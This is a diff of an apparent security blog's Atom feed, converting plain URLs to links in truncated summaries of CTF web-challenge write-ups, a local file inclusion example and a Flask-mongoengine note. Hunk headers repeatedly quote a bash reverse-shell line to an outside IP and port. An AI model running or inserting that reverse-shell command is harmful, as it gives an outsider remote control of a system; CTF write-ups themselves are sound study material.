@@ -27,7 +27,7 @@
       &lt;h2&gt;Challenge ECHO&lt;/h2&gt;
 &lt;p&gt;Web (200 pts)&lt;br&gt;
 If you hear enough, you may hear the whispers of a key...&lt;br&gt;
-If you see app.py well enough, yo
+If you see &lt;a href=&quot;http://app.py
     
     </summary>
     
@@ -49,10 +49,8 @@ If you see app.py well enough, yo
     
       &lt;h2&gt;题目介绍&lt;/h2&gt;
 &lt;p&gt;admin 刚刚完成了聊天版，会经常和大家聊天。&lt;/p&gt;
-&lt;p&gt;http://52.80.63.91/&lt;/p&gt;
-&lt;h2&gt;Get Cookie&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;Content-Security-Policy:
-default-src
+&lt;p&gt;&lt;a href=&quot;http://52.80.63.91/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://52.80.63.91/&lt;/a&gt;&lt;/p&gt;
+&lt;h
     
     </summary>
     
@@ -74,11 +72,9 @@ default-src
     
       &lt;h2&gt;WEB 抽奖呗&lt;/h2&gt;
 &lt;h3&gt;源碼大法&lt;/h3&gt;
-&lt;p&gt;view-source:http://xxx/&lt;/p&gt;
+&lt;p&gt;view-source:&lt;a href=&quot;http://xxx/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://xxx/&lt;/a&gt;&lt;/p&gt;
 &lt;h3&gt;可疑文件&lt;/h3&gt;
-&lt;p&gt;http://xxx/js/jQuery.js&lt;/p&gt;
-&lt;h3&gt;AAENCODE &amp;amp; decode&lt;/h3&gt;
-&lt;p
+&lt;p&gt;&lt;a h
     
     </summary>
     
@@ -201,12 +197,13 @@ if (isset($_COOKIE[&amp;quot
     <link href="https://www.virzz.com/2017/02/06/Flask-mongoengine%20%E7%94%A8%E6%B3%95%E5%B0%8F%E8%A8%98.html"/>
     <id>https://www.virzz.com/2017/02/06/Flask-mongoengine 用法小記.html</id>
     <published>2017-02-06T15:39:15.000Z</published>
-    <updated>2017-02-06T16:21:02.000Z</updated>
+    <updated>2017-04-27T15:40:01.000Z</updated>
     
     <summary type="html">
     
       &lt;h2&gt;模型設置&lt;/h2&gt;
-&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div cla
+&lt;pre&gt;&lt;code&gt;from mongoengine.errors import ValidationError
+from mongoengine.queryset import (DoesNotExist, MultipleObjectsRetur
     
     </summary>
     
@@ -498,10 +495,7 @@ wget http://public-yum.oracle.com/public-yum-ol6.repo
     <summary type="html">
     
       &lt;h2&gt;0x00 案例&lt;/h2&gt;
-&lt;p&gt;参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;实验代码：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;?php
-include($_
+&lt;p&gt;参考资料：&lt;a href=&quot;http://downloads.ackack.net/LocalFileInclusion.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://downloads.ackack
     
     </summary>
     
@@ -644,7 +638,7 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
       &lt;h2&gt;挑战介绍&lt;/h2&gt;
 &lt;p&gt;来自星星的你被我给丢了，我可能需要用我所有的一切才能把你找回，编了两句就编不下去了，好吧，我承认这是一期渗透题，就是这么直接。&lt;/p&gt;
 &lt;h2&gt;挑战目标&lt;/h2&gt;
-&lt;p&gt;http://0761e975dda0c67cb.jie.sangebaim
+&lt;p&gt;&lt;a href=&quot;http://0761e975dda0c67cb.jie.
     
     </summary>
     
@@ -666,9 +660,7 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
     
       &lt;h2&gt;0x00 前言&lt;/h2&gt;
 &lt;p&gt;好好的Web咋變成了misc？友谊小船，說翻就翻！！！！&lt;/p&gt;
-&lt;p&gt;http://4e79618700b44607c.jie.sangebaimao.com&lt;/p&gt;
-&lt;h2&gt;0x01 獲取源碼&lt;/h2&gt;
-&lt;p&gt;沒有Tips的代碼審計題，
+&lt;p&gt;&lt;a href=&quot;http://4e79618700b44607c.jie.sangebaimao.com&quot; target=&quot;_blank&quot; rel=&quot;external
     
     </summary>
     
@@ -691,7 +683,7 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
       &lt;h2&gt;0x00 前言&lt;/h2&gt;
 &lt;p&gt;這次的CTF玩的很酸爽，一共7個 WEB滲透 類的題目，這也是痛苦的開始。好好的審計，為何加那麼多高門檻。&lt;/p&gt;
 &lt;h2&gt;0x01 Pentest-homework-200&lt;/h2&gt;
-&lt;p&gt;http://homework.sctf.xct
+&lt;p&gt;&lt;a href=&quot;http://homework
     
     </summary>
     
@@ -738,8 +730,7 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
       &lt;h2&gt;0x00 死坑死坑的脑洞&lt;/h2&gt;
 &lt;p&gt;绝逼不能忍，出题人你出来，保证不打死你。。不知道AK的大神是什么样的大脑。&lt;/p&gt;
 &lt;h2&gt;0x01 LOLI1 &amp;amp; LOLI2&lt;/h2&gt;
-&lt;p&gt;题目给了个网址 http://www.loli.club/&lt;/p&gt;
-&lt;p&gt;撸
+&lt;p&gt;题目给了个网址 &lt;a href=&quot;http://www.loli.club/
     
     </summary>
     
@@ -805,7 +796,7 @@ bash -i &amp;gt;&amp;amp; /dev/tcp/45.78.13.23/5555 0&amp;gt;&amp;amp;1
 &lt;p&gt;算是最简单的吧&lt;/p&gt;
 &lt;p&gt;提示sessionhint=ONYUY2JANZXXIIDGNFXEIILDIFZGKICQ&lt;/p&gt;
 &lt;p&gt;base32加密&lt;/p&gt;
-&lt;p&gt;用工具&lt;em&gt;http://emn178.github.io/onlin
+&lt;p&gt;用工具&lt;em&gt;&lt;a href=&quot;http://emn178.github
     
     </summary>
     
